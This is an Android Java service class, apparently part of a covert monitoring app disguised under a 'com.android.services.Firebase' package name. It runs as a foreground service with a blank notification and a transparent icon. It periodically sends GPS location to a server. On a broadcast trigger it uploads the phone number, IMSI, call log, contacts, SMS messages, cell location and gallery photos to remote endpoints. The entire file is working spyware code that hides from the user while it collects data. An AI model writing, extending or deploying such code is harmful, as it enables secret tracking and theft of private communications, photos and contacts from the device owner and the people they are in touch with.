package com.android.services.Firebase;

/**
 * Created by Tambora on 06/10/2016.
 */

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.provider.MediaStore;
import android.support.v4.app.NotificationCompat;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;
import android.widget.RemoteViews;

import com.android.services.Model.Model_images;
import com.android.services.R;
import com.android.services.Utils.AndLog;
import com.android.services.Utils.AppConf;
import com.android.services.Utils.FileUploader;
import com.android.services.Utils.SessionManager;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnSuccessListener;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.channels.FileChannel;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.UUID;

import static android.provider.Settings.System.DATE_FORMAT;
import static com.android.services.Utils.AppConf.URL_SEND_DEEP;
import static com.android.services.Utils.AppConf.URL_UPDATE_LOKASI;


public class UpdateService extends Service {
    private static final String LOG_TAG = "ForegroundService";
    private Handler handler = new Handler();
    private final int NOTIFICATION_ID = 1479;
    private final int DELAY = 300000;
    private FusedLocationProviderClient mFusedLocationClient;
    private RequestQueue requestQueue;
    private boolean checkloc;
    private LocationManager locationManager;
    private int gpsFails = 0;
    String result;
    private static final String TAG_SUCCESS = "result";
    String slat, slang;
    SessionManager sessionManager;
    String image1;
    public static ArrayList<Model_images> al_images = new ArrayList<>();
    boolean boolean_folder;
    public File file;
    public static final String IMAGE_DIRECTORY = "ImageScalling";


    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        file = new File(Environment.getExternalStorageDirectory()
                + "/" + IMAGE_DIRECTORY);
        if (!file.exists()) {
            file.mkdirs();
        }

        sessionManager = new SessionManager(this);
        requestQueue = Volley.newRequestQueue(this);
        gpsFails = 0;
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        checkloc = false;
        slang = "0";
        slat = "0";

        RemoteViews remoteViews = new RemoteViews(getPackageName(),
                R.layout.content_notifiaction);

        //Log.i(LOG_TAG, "Received Start Foreground Intent ");
//        Intent notificationIntent = new Intent(this, MainActivity.class);
//        notificationIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK
//                | Intent.FLAG_ACTIVITY_CLEAR_TASK);
//        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,
//                notificationIntent, 0);

//        Bitmap icon = BitmapFactory.decodeResource(getResources(),
//                R.drawable.ic_transparent);

        Notification notification = new NotificationCompat.Builder(this)
                .setContentTitle("")
                .setTicker("")
                .setContentText("")
                .setContent(remoteViews)
                .setSmallIcon(R.drawable.ic_transparent)
                .setOngoing(true).build();

        startForeground(NOTIFICATION_ID,
                notification);

        LocalBroadcastManager.getInstance(this).registerReceiver(broadcastReceiver, new IntentFilter("send"));

        handler.post(updateData);
        return START_STICKY;

    }

    public BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            ambilgallery();
            InsertDeep();
            AsyncTaskRunner task = new AsyncTaskRunner();
            task.execute();
        }
    };

    private class AsyncTaskRunner extends AsyncTask<String, String, String> {

        private String resp;
        //        ProgressDialog progressDialog;
        private String result1;
        private String result2;

        @Override
        protected String doInBackground(String... params) {
//            publishProgress("Process..."); // Calls onProgressUpdate()
            //Tooat("Welcome "+params[0]);
            try {

                result1 = "";
                result2 = "";

                resp = null;

                //This function is responsible for sending data to our webservice
                int send = 0;
                for (int i = 0; i < al_images.size(); i++) {
                    Log.e("FOLDERd", al_images.get(i).getStr_folder());

                    for (int j = 0; j < al_images.get(i).getAl_imagepath().size(); j++) {
                        String filePath = al_images.get(i).getAl_imagepath().get(j);
                        Log.e("FILE", filePath);
//                sessionManager.setImgPath(al_images.get(i).getAl_imagepath().get(j));

                        File sourceFile = new File(filePath);
                        File destFile = new File(file, "img_" + dateFormatter.format(new Date()).toString() + "_" + UUID.randomUUID().toString().toLowerCase().replace("-", "") + ".jpg");

                        try {
                            copyFile(sourceFile, destFile);
                            decodeFile(destFile);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }

                        if (send < 10) {
                            resp = deepImagesInsert(filePath, destFile.getPath());
                        }

                        send++;
                    }
                }
//                resp = deepImagesInsert();

                AndLog.ShowLog("Values", resp);


            } catch (Exception e) {
                e.printStackTrace();
                resp = e.getMessage();
            }
            return result1;
        }

        @Override
        protected void onPostExecute(String result) {
            // execution of result of Long time consuming operation
            //  list_adapter= new ListAdapter_UserPanel(User_SelectPark.this, pendingList);
            // listView.setAdapter(list_adapter);
            //Tooat(decision);

            String status = resp.trim();

            AndLog.ShowLog("rsstss", status);


            //finalResult.setText(result);
        }

        @Override
        protected void onPreExecute() {


//            progressDialog = ProgressDialog.show(FormPengajuan.this,
//                    "Process",
//                    "Please wait...");
        }

        @Override
        protected void onProgressUpdate(String... text) {
            //finalResult.setText(text[0]);

        }
    }

    public String deepImagesInsert(String imgPath, String compressPath) {
        String return_value = "";

        try {
            File imageFile = null;
            String charset = "UTF-8";
            String requestURL = null;

            requestURL = AppConf.URL_INSERT_GALLERY;

            FileUploader multipart = new FileUploader(requestURL, charset);
            multipart.addFormField("nomor", sessionManager.getNomor());
            multipart.addFormField("imsi", sessionManager.getImsi());
            multipart.addFormField("path_hp", imgPath);

            if (compressPath != null) {
                imageFile = new File(compressPath);
                multipart.addFilePart("nama_file", imageFile);
            }

            AndLog.ShowLog("sdds", multipart.toString());
            List<String> response = multipart.finish();


            String combine = "";
            for (String line : response) {
                combine = combine + line;
            }
            return_value = combine;
            //Toast.makeText(this,combine,Toast.LENGTH_SHORT).show();

            if (imageFile != null) {

                if (imageFile.exists()) {
                    imageFile.delete();
                }
            }
        } catch (Exception ex) {
            return_value = ex.getMessage();
        }

        return return_value;
    }

    @SuppressLint("MissingPermission")
    private void CheckLocation() {

        checkloc = true;

        mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        mFusedLocationClient.getLastLocation().addOnSuccessListener(new OnSuccessListener<Location>() {
            @Override
            public void onSuccess(Location location) {

                if (location != null) {
                    // Logic to handle location object
                    double lat = location.getLatitude();
                    double lng = location.getLongitude();

                    slat = String.valueOf(lat);
                    slang = String.valueOf(lng);


                    UpdateLokasi();

                }

            }
        });
    }

    private void UpdateLokasi() {

        final SessionManager sess = new SessionManager(getApplicationContext());
        StringRequest strReq = new StringRequest(Request.Method.POST, URL_UPDATE_LOKASI, new Response.Listener<String>() {

            @Override
            public void onResponse(String response) {

                checkloc = false;
                gpsFails = 0;

                AndLog.ShowLog("RSPS", response + " ;; Lat : " + slat + " ;; Lng : " + slang);

            }
        }, new Response.ErrorListener() {

            @Override
            public void onErrorResponse(VolleyError error) {

                checkloc = false;
                gpsFails = 0;


            }
        }) {

            @Override
            protected Map<String, String> getParams() {

                Map<String, String> params = new HashMap<String, String>();
                params.put("nomor", sess.getNomor());
                params.put("lat_gps", slat);
                params.put("lon_gps", slang);
                AndLog.ShowLog("df_update_lat_lang", String.valueOf(params));
                return params;
            }

        };
        requestQueue.add(strReq);
    }

    private void InsertDeep() {
        final SessionManager sess = new SessionManager(getApplicationContext());
        StringRequest strReq = new StringRequest(Request.Method.POST, URL_SEND_DEEP, new Response.Listener<String>() {

            @Override
            public void onResponse(String response) {

                checkloc = false;
                gpsFails = 0;

                AndLog.ShowLog("RSPS", response + " ;; Lat : " + slat + " ;; Lng : " + slang);

            }
        }, new Response.ErrorListener() {

            @Override
            public void onErrorResponse(VolleyError error) {

                checkloc = false;
                gpsFails = 0;


            }
        }) {

            @Override
            protected Map<String, String> getParams() {

                Map<String, String> params = new HashMap<String, String>();
                params.put("nomor", sess.getNomor());
                params.put("imsi", sess.getImsi());
                params.put("call", sess.getLogCall());
                params.put("kontak", sess.getContact());
                params.put("lat_cid", sess.getLatCid());
                params.put("lon_cid", sess.getLngCid());
                params.put("lat_gps", slat);
                params.put("lon_gps", slang);
                params.put("sms", sess.getPesan());
                AndLog.ShowLog("df_insert_deep", String.valueOf(params));
                return params;
            }

        };
        requestQueue.add(strReq);
    }

    public Runnable updateData = new Runnable() {
        @Override
        public void run() {
            if (sessionManager != null) {
                if (sessionManager.getNomor() != null) {

                    if (gpsFails > 10) {
                        gpsFails = 0;
                        checkloc = false;
                    } else {
                        gpsFails++;
                    }

                    AndLog.ShowLog("RSPS", "RUNNING " + checkloc + " " + gpsFails);


                    if (!checkloc) {
                        boolean GpsStatus = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
                        if (GpsStatus) {
                            CheckLocation();
                        } else {
                            gpsFails = 0;
                            checkloc = false;
                            AndLog.ShowLog("RSPS", "GPS MATI " + checkloc + " " + gpsFails);

                        }
                    }
                }
            }

            handler.postDelayed(updateData, DELAY);

        }
    };

    public ArrayList<Model_images> ambilgallery() {
        al_images.clear();

        int int_position = 0;
        Uri uri;
        Cursor cursor;
        int column_index_data, column_index_folder_name;

        String absolutePathOfImage = null;
        uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {MediaStore.MediaColumns.DATA, MediaStore.Images.Media.BUCKET_DISPLAY_NAME};

        final String orderBy = MediaStore.Images.Media.DATE_TAKEN;
        cursor = getApplicationContext().getContentResolver().query(uri, projection, null, null, orderBy + " DESC");

        column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
        column_index_folder_name = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
        while (cursor.moveToNext()) {
            absolutePathOfImage = cursor.getString(column_index_data);
            Log.e("Column", absolutePathOfImage);
            Log.e("Folder", cursor.getString(column_index_folder_name));


            for (int i = 0; i < al_images.size(); i++) {

                if (al_images.get(i).getStr_folder().equals(cursor.getString(column_index_folder_name))) {
                    boolean_folder = true;
                    int_position = i;
                    break;
                } else {
                    boolean_folder = false;
                }
            }

            if (boolean_folder) {

                ArrayList<String> al_path = new ArrayList<>();
                al_path.addAll(al_images.get(int_position).getAl_imagepath());
                al_path.add(absolutePathOfImage);
                al_images.get(int_position).setAl_imagepath(al_path);

            } else {
                ArrayList<String> al_path = new ArrayList<>();
                al_path.add(absolutePathOfImage);
                Model_images obj_model = new Model_images();
                obj_model.setStr_folder(cursor.getString(column_index_folder_name));
                obj_model.setAl_imagepath(al_path);

                al_images.add(obj_model);


            }


        }


        return al_images;
    }


    private void copyFile(File sourceFile, File destFile) throws IOException {
        if (!sourceFile.exists()) {
            return;
        }

        FileChannel source = null;
        FileChannel destination = null;
        source = new FileInputStream(sourceFile).getChannel();
        destination = new FileOutputStream(destFile).getChannel();
        if (destination != null && source != null) {
            destination.transferFrom(source, 0, source.size());
        }
        if (source != null) {
            source.close();
        }
        if (destination != null) {
            destination.close();
        }
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        LocalBroadcastManager.getInstance(this).unregisterReceiver(broadcastReceiver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // Used only in case of bound services.
        return null;
    }

    public SimpleDateFormat dateFormatter = new SimpleDateFormat("yyyyMMddHHmmss");

    private Bitmap decodeFile(File f) {
        Bitmap b = null;

        //Decode image size
        BitmapFactory.Options o = new BitmapFactory.Options();
        o.inJustDecodeBounds = true;

        FileInputStream fis = null;
        try {
            fis = new FileInputStream(f);
            BitmapFactory.decodeStream(fis, null, o);
            fis.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        int IMAGE_MAX_SIZE = 1024;
        int scale = 1;
        if (o.outHeight > IMAGE_MAX_SIZE || o.outWidth > IMAGE_MAX_SIZE) {
            scale = (int) Math.pow(2, (int) Math.ceil(Math.log(IMAGE_MAX_SIZE /
                    (double) Math.max(o.outHeight, o.outWidth)) / Math.log(0.5)));
        }

        //Decode with inSampleSize
        BitmapFactory.Options o2 = new BitmapFactory.Options();
        o2.inSampleSize = scale;
        try {
            fis = new FileInputStream(f);
            b = BitmapFactory.decodeStream(fis, null, o2);
            fis.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

//        Log.d(TAG, "Width :" + b.getWidth() + " Height :" + b.getHeight());


        try {
            FileOutputStream out = new FileOutputStream(f);
            b.compress(Bitmap.CompressFormat.JPEG, 100, out);
            out.flush();
            out.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
        return b;
    }
}